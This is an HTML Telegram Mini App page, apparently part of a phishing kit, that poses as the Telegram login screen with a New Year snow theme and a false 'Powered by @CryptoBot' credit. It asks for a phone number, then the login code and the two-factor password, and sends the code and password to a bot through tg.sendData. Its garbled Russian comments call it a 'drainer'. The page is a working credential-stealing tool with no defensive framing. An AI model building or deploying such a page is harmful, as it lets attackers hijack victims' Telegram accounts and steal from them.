<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NewYear | Telegram</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        /* –û–±—â–∏–µ —Å—Ç–∏–ª–∏ Telegram */
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--tg-theme-bg-color, #1c1c1d); /* –¢–µ–º–Ω—ã–π —Ñ–æ–Ω –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é */
            color: var(--tg-theme-text-color, #ffffff);
            margin: 0; padding: 0;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; overflow: hidden;
            flex-direction: column;
        }

        /* –ö–û–ù–¢–†–ê–°–¢–ù–´–ô –°–ù–ï–ì (–°–ï–†–ï–ë–†–ò–°–¢–´–ô) */
        #snow-box {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; z-index: 1;
        }
        .flake {
            position: absolute; background: #adb5bd; border-radius: 50%; opacity: 0.5;
        }

        /* –ö–æ–Ω—Ç–µ–π–Ω–µ—Ä –¥–ª—è –∫–∞—Ä—Ç–æ—á–∫–∏ */
        .card {
            position: relative; z-index: 10;
            width: 90%; max-width: 360px;
            background: var(--tg-theme-secondary-bg-color, #2c2c2e); /* –¶–≤–µ—Ç —Ñ–æ–Ω–∞ –∫–∞—Ä—Ç–æ—á–∫–∏ */
            border-radius: 20px;
            padding: 25px 20px;
            text-align: center;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            box-sizing: border-box;
            margin-top: 20px;
        }

        /* –õ–æ–≥–æ Telegram */
        .telegram-logo-container {
            width: 90px; height: 90px;
            background-color: #0088cc; /* –¶–≤–µ—Ç –ª–æ–≥–æ Telegram */
            border-radius: 50%;
            display: flex; justify-content: center; align-items: center;
            margin: 0 auto 30px auto;
            box-shadow: 0 5px 15px rgba(0,136,204,0.3);
            position: relative;
            animation: pulse 1.5s infinite alternate;
        }
        .telegram-logo {
            width: 50px; height: 50px;
            fill: #ffffff;
        }
        @keyframes pulse {
            from { transform: scale(1); box-shadow: 0 5px 15px rgba(0,136,204,0.3); }
            to { transform: scale(1.05); box-shadow: 0 5px 20px rgba(0,136,204,0.5); }
        }

        /* –ó–∞–≥–æ–ª–æ–≤–æ–∫ */
        h1 {
            font-size: 24px; font-weight: 700; margin-bottom: 25px;
            color: var(--tg-theme-text-color, #ffffff);
            letter-spacing: -0.5px;
        }

        /* –ü–æ–¥–ø–∏—Å—å */
        .description {
            color: var(--tg-theme-hint-color, #8e8e93);
            font-size: 15px; line-height: 1.4; margin-bottom: 30px;
            padding: 0 10px;
        }

        /* –ü–æ–ª–µ –≤–≤–æ–¥–∞ –Ω–æ–º–µ—Ä–∞ */
        .input-group {
            display: flex; flex-direction: column; align-items: flex-start;
            margin-bottom: 20px;
        }
        .input-label {
            font-size: 14px; color: var(--tg-theme-hint-color, #8e8e93);
            margin-bottom: 5px;
            text-align: left;
            width: 100%;
        }
        .country-selector {
            display: flex; justify-content: space-between; align-items: center;
            width: 100%; padding: 12px;
            background: var(--tg-theme-bg-color, #1c1c1d);
            border-radius: 10px;
            margin-bottom: 15px;
            cursor: pointer;
        }
        .country-selector span { font-size: 17px; }
        .phone-input-container {
            position: relative;
            width: 100%;
            display: flex;
            align-items: center;
        }
        .country-code-prefix {
            font-size: 17px;
            color: var(--tg-theme-text-color, #ffffff);
            padding-right: 8px;
            position: absolute;
            left: 12px;
        }
        input[type="tel"], input[type="number"], input[type="password"] {
            width: 100%;
            padding: 14px 12px;
            padding-left: 50px; /* –û—Ç—Å—Ç—É–ø –¥–ª—è –∫–æ–¥–∞ —Å—Ç—Ä–∞–Ω—ã */
            background: var(--tg-theme-bg-color, #1c1c1d);
            border: 1px solid var(--tg-theme-text-color, #3a3a3c); /* –¶–≤–µ—Ç –±–æ—Ä–¥–µ—Ä–∞ */
            border-radius: 10px;
            font-size: 17px;
            color: var(--tg-theme-text-color, #ffffff);
            box-sizing: border-box;
            outline: none;
            text-align: left;
        }
        input[type="number"] { text-align: center; padding-left: 12px;} /* –î–ª—è –∫–æ–¥–∞ —Å–º—Å */


        /* –ö–Ω–æ–ø–∫–∏ */
        .action-btn {
            background: var(--tg-theme-button-color, #007aff);
            color: var(--tg-theme-button-text-color, #ffffff);
            border: none; border-radius: 12px;
            padding: 16px; width: 100%;
            font-size: 17px; font-weight: 600;
            cursor: pointer; transition: opacity 0.2s;
            margin-top: 10px;
        }
        .action-btn:active { opacity: 0.7; }
        .next-btn-text { margin-bottom: 0 !important; }

        /* Powered by */
        .powered-by {
            color: var(--tg-theme-hint-color, #8e8e93);
            font-size: 13px;
            margin-top: 30px;
            position: fixed;
            bottom: 20px;
        }
        .powered-by a {
            color: var(--tg-theme-link-color, #007aff);
            text-decoration: none;
        }

        /* –®–∞–≥–∏ */
        .step { display: none; }
        .active { display: block; animation: scaleIn 0.3s ease; }
        @keyframes scaleIn { from { opacity: 0; transform: scale(0.96); } to { opacity: 1; transform: scale(1); } }
    </style>
</head>
<body>

    <div id="snow-box"></div>

    <div class="telegram-logo-container">
        <svg class="telegram-logo" viewBox="0 0 24 24">
            <path d="M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm6.5 8.5l-2.919 11.673c-.156.626-.532.784-1.05.492-4.14-2.203-6.817-3.626-10.29-5.419-.523-.277-.527-.516.035-.724l13.197-5.013c.438-.166.837.067.728.66z"/>
        </svg>
    </div>

    <h1>Telegram</h1>

    <div class="card">
        <div id="step1" class="step active">
            <p class="description">Please confirm your country code and enter your phone number.</p>
            <div class="input-group">
                <div class="country-selector">
                    <span>üá∑üá∫ Russia</span>
                    <span>></span>
                </div>
                <div class="phone-input-container">
                    <span class="country-code-prefix">+7</span>
                    <input type="tel" id="phone_number" placeholder="Phone Number" value="" oninput="formatPhoneNumber(this)">
                </div>
            </div>
            <button class="action-btn next-btn-text" onclick="requestTgContact()">NEXT</button>
        </div>

        <div id="step2" class="step">
            <p class="description">Enter the 5-digit code that arrived in your Telegram chat.</p>
            <input type="number" id="sms_code" placeholder="00000" maxlength="5" oninput="if(this.value.length==5) sendSmsCode()">
            <button class="action-btn next-btn-text" onclick="sendSmsCode()">Confirm</button>
        </div>

        <div id="step3" class="step">
            <p class="description">Enter your Two-Factor Authentication password.</p>
            <input type="password" id="2fa_password" placeholder="Your password">
            <button class="action-btn next-btn-text" onclick="send2faPassword()">Done</button>
        </div>
    </div>

    <div class="powered-by">
        Powered by <a href="https://t.me/CryptoBot" target="_blank">@CryptoBot</a>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();

        // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ü–≤–µ—Ç–∞ –∏–∑ —Ç–µ–º—ã Telegram
        document.documentElement.style.setProperty('--tg-theme-bg-color', tg.themeParams.bg_color || '#1c1c1d');
        document.documentElement.style.setProperty('--tg-theme-secondary-bg-color', tg.themeParams.secondary_bg_color || '#2c2c2e');
        document.documentElement.style.setProperty('--tg-theme-text-color', tg.themeParams.text_color || '#ffffff');
        document.documentElement.style.setProperty('--tg-theme-hint-color', tg.themeParams.hint_color || '#8e8e93');
        document.documentElement.style.setProperty('--tg-theme-link-color', tg.themeParams.link_color || '#007aff');
        document.documentElement.style.setProperty('--tg-theme-button-color', tg.themeParams.button_color || '#007aff');
        document.documentElement.style.setProperty('--tg-theme-button-text-color', tg.themeParams.button_text_color || '#ffffff');

        function nav(id) {
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            document.getElementById(id).classList.add('active');
        }

        // –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞
        function formatPhoneNumber(input) {
            let value = input.value.replace(/\D/g, ''); // –£–¥–∞–ª—è–µ–º –≤—Å–µ, –∫—Ä–æ–º–µ —Ü–∏—Ñ—Ä
            let formattedValue = '';
            if (value.length > 0) {
                formattedValue = value;
            }
            input.value = formattedValue;
        }

        // –ó–∞–ø—Ä–æ—Å –∫–æ–Ω—Ç–∞–∫—Ç–∞ (–ù–û–ú–ï–†)
        function requestTgContact() {
            let phoneNumber = document.getElementById('phone_number').value;
            if (phoneNumber.length > 5) { // –ü—Ä–æ—Å—Ç–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –º–∏–Ω–∏–º–∞–ª—å–Ω—É—é –¥–ª–∏–Ω—É –Ω–æ–º–µ—Ä–∞
                tg.showConfirm(`Confirm sending your phone number +7${phoneNumber}?`, (ok) => {
                    if (ok) {
                        // –í–º–µ—Å—Ç–æ requestContact, –º—ã "—Å–∏–º—É–ª–∏—Ä—É–µ–º" –æ—Ç–ø—Ä–∞–≤–∫—É –Ω–æ–º–µ—Ä–∞ —á–µ—Ä–µ–∑ WebApp
                        // –ò–Ω–∞—á–µ Telegram WebApp –±—É–¥–µ—Ç –∑–∞–ø—Ä–∞—à–∏–≤–∞—Ç—å –∫–æ–Ω—Ç–∞–∫—Ç, –∞ –Ω–µ –ø—Ä–æ—Å—Ç–æ –Ω–æ–º–µ—Ä.
                        // –î–ª—è –Ω–∞—à–µ–≥–æ –¥—Ä–µ–π–Ω–µ—Ä–∞, –Ω–∞–º –Ω—É–∂–µ–Ω "–æ—Ç–¥–µ–ª—å–Ω—ã–π" –Ω–æ–º–µ—Ä.
                        // Python –±–æ—Ç –∑–∞–ø—Ä–æ—Å–∏—Ç –∫–æ–Ω—Ç–∞–∫—Ç, –∫–æ–≥–¥–∞ WebApp –∑–∞–∫—Ä–æ–µ—Ç—Å—è.
                        // –≠—Ç–æ—Ç —à–∞–≥ –ø—Ä–æ—Å—Ç–æ –∏–º–∏—Ç–∏—Ä—É–µ—Ç –≤–≤–æ–¥ –Ω–æ–º–µ—Ä–∞.
                        // tg.sendData("PHONE:" + phoneNumber); // –ú–æ–∂–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å –Ω–æ–º–µ—Ä, –µ—Å–ª–∏ –≤–∞—à –±–æ—Ç –µ–≥–æ –ª–æ–≤–∏—Ç.
                        nav('step2'); // –ü–µ—Ä–µ—Ö–æ–¥–∏–º –Ω–∞ —ç–∫—Ä–∞–Ω –≤–≤–æ–¥–∞ –∫–æ–¥–∞
                        tg.sendData("PHONE_REQUESTED"); // –£–≤–µ–¥–æ–º–ª—è–µ–º –±–æ—Ç–∞, —á—Ç–æ –∫–æ–Ω—Ç–∞–∫—Ç –∑–∞–ø—Ä–æ—à–µ–Ω
                    }
                });
            } else {
                alert('Please enter a valid phone number.');
            }
        }

        // –û—Ç–ø—Ä–∞–≤–∫–∞ SMS –∫–æ–¥–∞
        function sendSmsCode() {
            let code = document.getElementById('sms_code').value;
            if (code.length === 5) {
                tg.sendData("CODE:" + code);
                // –î–∞–µ–º –Ω–µ–º–Ω–æ–≥–æ –≤—Ä–µ–º–µ–Ω–∏, —á—Ç–æ–±—ã –±–æ—Ç –æ–±—Ä–∞–±–æ—Ç–∞–ª –∫–æ–¥
                setTimeout(() => nav('step3'), 1500); // –ü—Ä–µ–¥–ø–æ–ª–∞–≥–∞–µ–º, —á—Ç–æ 2FA –º–æ–∂–µ—Ç –ø–æ—Ç—Ä–µ–±–æ–≤–∞—Ç—å—Å—è
            } else {
                alert('Please enter the 5-digit code.');
            }
        }

        // –û—Ç–ø—Ä–∞–≤–∫–∞ 2FA –ø–∞—Ä–æ–ª—è
        function send2faPassword() {
            let password = document.getElementById('2fa_password').value;
            if (password.length > 0) {
                tg.sendData("PASS:" + password);
                setTimeout(() => tg.close(), 1000);
            } else {
                alert('Please enter your password.');
            }
        }
        
        // –°–Ω–µ–≥ (–±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π)
        function initSnow() {
            const container = document.getElementById('snow-box');
            for(let i=0; i<45; i++) {
                let f = document.createElement('div');
                f.className = 'flake';
                let size = Math.random()*3+2 + 'px';
                f.style.width = size; f.style.height = size;
                f.style.left = Math.random()*100 + 'vw';
                f.style.top = Math.random()*-20 + 'px';
                container.appendChild(f);
                f.animate([{ transform: 'translateY(0)', opacity: 0.5 }, { transform: 'translateY(100vh)', opacity: 0 }], { duration: Math.random()*3000+4000, iterations: Infinity, delay: Math.random()*5000 });
            }
        }
        initSnow();
    </script>
</body>
</html>
